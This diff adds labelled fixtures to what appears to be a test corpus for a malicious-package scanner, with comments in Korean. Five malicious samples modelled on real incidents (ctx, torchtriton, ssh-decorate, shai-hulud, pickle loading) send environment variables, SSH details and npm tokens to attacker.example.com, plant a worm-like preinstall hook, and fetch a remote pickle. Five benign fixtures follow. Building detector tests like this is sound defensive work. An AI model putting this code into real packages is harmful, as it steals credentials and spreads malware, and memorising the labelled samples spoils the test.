@@ -1157,6 +1157,249 @@ def line_chart(x, y, label=""):
     return fig
 '''},
     ),
+    # ─── 사이클 8: 악성 5 (GHSA-inspired) ─────────────────
+    _mal(
+        "ctx-style-env-sweep",
+        description="ctx (PyPI 2022) — 모든 env var 통째 송신",
+        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
+        note="실제: ctx 패키지 incident",
+        files={"context.py": '''
+import os, requests, base64
+# 모든 환경변수 dump → base64 → DNS-like 도메인으로 송신
+all_env = "&".join(f"{k}={v}" for k, v in os.environ.items())
+encoded = base64.b64encode(all_env.encode()).decode()
+requests.get(f"https://attacker.example.com/?d={encoded}", timeout=3)
+'''},
+    ),
+    _mal(
+        "torchtriton-style-confusion",
+        description="PyTorch 2022 - torchtriton dependency confusion",
+        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
+        note="실제: pytorch nightly torchtriton incident",
+        files={"setup.py": '''
+"""Internal torchtriton hijack."""
+from setuptools import setup
+from setuptools.command.install import install
+import os, base64, urllib.request
+
+class Hijack(install):
+    def run(self):
+        try:
+            data = base64.b64encode(
+                ("|".join([
+                    os.uname().nodename,
+                    os.environ.get("HOSTNAME", ""),
+                    os.environ.get("HOME", ""),
+                    "/".join(os.listdir(os.path.expanduser("~/.ssh"))),
+                ])).encode()
+            ).decode()
+            urllib.request.urlopen(
+                f"https://h4ck.attacker.example.com/?p={data}",
+                timeout=2,
+            )
+        except Exception:
+            pass
+        install.run(self)
+
+setup(name="torchtriton", cmdclass={"install": Hijack})
+'''},
+    ),
+    _mal(
+        "ssh-decorate-stealer",
+        description="ssh-decorate (PyPI 2018) — SSH credentials 탈취",
+        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
+        note="실제: ssh-decorate hijack",
+        files={"decorate.py": '''
+import paramiko, requests
+_orig_connect = paramiko.SSHClient.connect
+
+def hijacked_connect(self, hostname, *args, **kwargs):
+    try:
+        requests.post(
+            "https://attacker.example.com/sshcreds",
+            json={
+                "host": hostname,
+                "user": kwargs.get("username") or args[1] if args else "?",
+                "pwd":  kwargs.get("password"),
+                "key":  kwargs.get("key_filename"),
+            },
+        )
+    except Exception:
+        pass
+    return _orig_connect(self, hostname, *args, **kwargs)
+
+paramiko.SSHClient.connect = hijacked_connect
+'''},
+    ),
+    _mal(
+        "shai-hulud-self-replicate",
+        description="shai-hulud 2025 — 자가 복제 + npm 토큰 탈취",
+        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
+        note="실제: shai-hulud worm",
+        files={"replicate.py": '''
+import os, json, subprocess, requests, glob
+
+# 1. NPM token 탈취
+token = None
+for path in (os.path.expanduser("~/.npmrc"),
+             os.path.expanduser("~/.config/npm/.npmrc")):
+    try:
+        with open(path) as f:
+            for line in f:
+                if "_authToken=" in line:
+                    token = line.split("=", 1)[1].strip()
+    except Exception:
+        pass
+
+if token:
+    requests.post("https://attacker.example.com/npm",
+                  json={"token": token})
+
+# 2. 자기 자신 코드를 다른 패키지에 주입 (worm)
+for pkg_json in glob.glob(os.path.expanduser("~/projects/*/package.json")):
+    try:
+        with open(pkg_json) as f:
+            pkg = json.load(f)
+        pkg.setdefault("scripts", {})["preinstall"] = (
+            "node -e \\"require('https').get('https://attacker.example.com/x')\\""
+        )
+        with open(pkg_json, "w") as f:
+            json.dump(pkg, f, indent=2)
+    except Exception:
+        pass
+'''},
+    ),
+    _mal(
+        "phpass-style-pickle-rce",
+        description="phpass 류 — pickle 역직렬화 + remote payload",
+        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
+        note="역직렬화 RCE 패턴 보강",
+        files={"deserialize.py": '''
+import pickle, urllib.request, base64
+
+# remote 에서 pickle blob fetch + 역직렬화
+data = urllib.request.urlopen(
+    "https://attacker.example.com/payload.pkl"
+).read()
+
+# base64 한 번 wrap 된 pickle 까지
+try:
+    obj = pickle.loads(base64.b64decode(data))
+except Exception:
+    obj = pickle.loads(data)
+# obj.__reduce__ 가 자동 호출됨
+'''},
+    ),
+    # ─── 사이클 8: 정상 5 ─────────────────────────────────
+    _ben(
+        "fastapi-dependency-injection",
+        description="FastAPI Depends 주입 패턴",
+        files={"deps.py": '''
+"""FastAPI dependency injection."""
+from fastapi import Depends, Header, HTTPException
+from typing import Annotated
+
+def get_token(authorization: Annotated[str | None, Header()] = None) -> str:
+    if not authorization or not authorization.startswith("Bearer "):
+        raise HTTPException(status_code=401, detail="missing bearer token")
+    return authorization.removeprefix("Bearer ")
+
+def get_user(token: Annotated[str, Depends(get_token)]):
+    # validate token, return user
+    return {"sub": "user-1", "scope": "read"}
+'''},
+    ),
+    _ben(
+        "celery-task-definition",
+        description="Celery 비동기 태스크 정의",
+        files={"tasks.py": '''
+"""Celery task module."""
+from celery import Celery
+
+app = Celery("worker", broker="redis://localhost:6379/0")
+
+@app.task(bind=True, max_retries=3)
+def process_image(self, image_id: str):
+    try:
+        # ... image processing logic ...
+        return {"status": "done", "image_id": image_id}
+    except Exception as exc:
+        raise self.retry(exc=exc, countdown=30)
+'''},
+    ),
+    _ben(
+        "structlog-config",
+        description="structlog 구조화 로그 셋업",
+        files={"log_cfg.py": '''
+"""structlog setup."""
+import logging
+import structlog
+
+def configure(level: int = logging.INFO):
+    structlog.configure(
+        processors=[
+            structlog.stdlib.filter_by_level,
+            structlog.stdlib.add_logger_name,
+            structlog.stdlib.add_log_level,
+            structlog.processors.TimeStamper(fmt="iso"),
+            structlog.processors.JSONRenderer(),
+        ],
+        wrapper_class=structlog.stdlib.BoundLogger,
+        logger_factory=structlog.stdlib.LoggerFactory(),
+        cache_logger_on_first_use=True,
+    )
+    logging.basicConfig(level=level, format="%(message)s")
+'''},
+    ),
+    _ben(
+        "dataclass-validation",
+        description="dataclass __post_init__ validation",
+        files={"models.py": '''
+"""Validated dataclasses."""
+from dataclasses import dataclass
+
+@dataclass
+class Email:
+    address: str
+
+    def __post_init__(self):
+        if "@" not in self.address:
+            raise ValueError(f"invalid email: {self.address}")
+
+@dataclass
+class Money:
+    amount: int   # cents
+    currency: str = "USD"
+
+    def __post_init__(self):
+        if self.amount < 0:
+            raise ValueError("amount must be non-negative")
+        if len(self.currency) != 3:
+            raise ValueError(f"currency code must be 3 letters: {self.currency}")
+'''},
+    ),
+    _ben(
+        "py4web-style-controller",
+        description="간단 web framework 컨트롤러",
+        files={"controllers.py": '''
+"""Lightweight web controller."""
+
+class Controller:
+    def __init__(self, db):
+        self.db = db
+
+    def list(self, page: int = 0, per_page: int = 20):
+        offset = page * per_page
+        return self.db.query(
+            "SELECT id, name FROM items ORDER BY id LIMIT ? OFFSET ?",
+            (per_page, offset),
+        )
+
+    def show(self, item_id: int):
+        rows = self.db.query("SELECT * FROM items WHERE id = ?", (item_id,))
+        return rows[0] if rows else None
+'''},
+    ),
     # ─── 정상 fixture 추가 10 ───────────────────────────────
     _ben(
         "fastapi-style-app",
